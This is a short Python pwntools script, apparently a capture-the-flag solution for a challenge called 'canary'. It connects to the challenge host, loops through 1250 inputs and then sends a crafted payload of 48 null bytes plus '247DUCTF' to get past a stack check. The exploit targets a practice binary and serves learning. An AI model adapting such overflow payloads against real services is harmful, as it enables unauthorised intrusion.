#!/usr/bin/python3

from pwn import *
import os
from time import sleep

#r = process("./canary")
r = remote(os.environ.get("HOST", "127.0.0.1"), 1337)
r.recvuntil("mine?")

for i in range(1250):
  r.sendline("A")
  print(r.recvuntil("you!").decode('ascii', 'ignore'))

r.send(b"\x00"*48 + b"247DUCTF")
r.clean_and_log()